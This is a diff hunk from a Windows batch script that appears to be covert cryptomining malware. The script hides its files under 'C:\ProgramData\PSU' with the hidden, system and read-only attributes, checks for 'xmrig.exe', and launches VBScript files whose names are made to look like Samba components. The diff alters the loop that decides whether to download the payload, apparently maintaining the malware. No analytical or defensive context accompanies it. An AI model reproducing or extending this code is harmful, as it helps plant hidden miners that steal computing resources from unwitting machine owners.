@@ -2263,7 +2263,7 @@ attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
 goto start
 :execute
-if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto start
 if not exist "C:\ProgramData\PSU\execute.vbs" goto download
 start "" "C:\ProgramData\PSU\samba.vbs"
 start "" "C:\ProgramData\PSU\execute.vbs"
